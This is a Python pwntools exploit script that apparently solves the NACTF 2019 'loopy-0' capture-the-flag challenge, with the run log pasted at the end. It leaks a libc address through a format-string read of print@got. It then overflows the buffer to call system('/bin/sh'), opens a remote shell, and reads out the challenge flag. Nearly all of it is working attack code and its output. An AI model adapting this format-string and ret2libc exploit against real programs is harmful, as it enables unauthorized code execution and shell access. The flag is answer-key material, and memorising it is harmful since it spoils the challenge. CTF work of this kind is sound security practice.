from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31283)
con.recvregex('Type something>')

payload = pack(0x804c00c)  # print@got
payload += '%4$s'
payload += 'A' * 68
payload += pack(0x08049192)
con.sendline(payload)

msg = con.recvregex('A' * 68)
libc_base_addr = unpack(msg[15:19]) - 0x00052cb0
print "[+] libc_base_addr = 0x%x" % libc_base_addr

con.recvregex('Type something>')
payload = 'A' * 76
payload += pack(libc_base_addr + 0x03ec00)  # system@got
payload += pack(0xdeadbeef)
payload += pack(libc_base_addr + 0x17eaaa)  # /bin/sh
con.sendline(payload)

con.interactive()

'''
$ python loopy-0.py
[+] Opening connection to shell.2019.nactf.com on port 31283: Done
[+] libc_base_addr = 0xf7d04000
[*] Switching to interactive mode
You typed: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$
$ ls
flag.txt
loopy-0
$ cat flag.txt
nactf{jus7_c411_17_4g41n_AnZPLmjm}
'''
